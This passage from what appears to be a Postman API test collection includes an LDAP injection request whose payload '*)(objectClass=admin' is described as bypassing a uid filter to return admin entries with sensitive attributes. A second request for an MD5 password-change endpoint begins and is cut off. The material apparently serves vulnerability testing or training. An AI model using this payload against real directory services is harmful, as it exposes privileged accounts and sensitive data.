            "body": {
              "mode": "raw",
              "raw": "{\"query\": \"*)(objectClass=admin\", \"attribute\": \"uid\"}"
            },
            "description": "CWE-90: LDAP injection in search filter. Payload '*)(objectClass=admin' bypasses the uid filter to return admin objects. Observe: admin entries including sensitive attributes returned."
          }
        },
        {
          "name": "LDAP Change Password (MD5)",
          "request": {
            "method": "POST",
            "header": [{"key": "Content-Type", "value": "application/json"}],
            "url": {"raw": "{{base_url}}/api/ldap/change-password", "host": ["{{base_url}}"], "path": ["api", "ldap", "change-password"]},
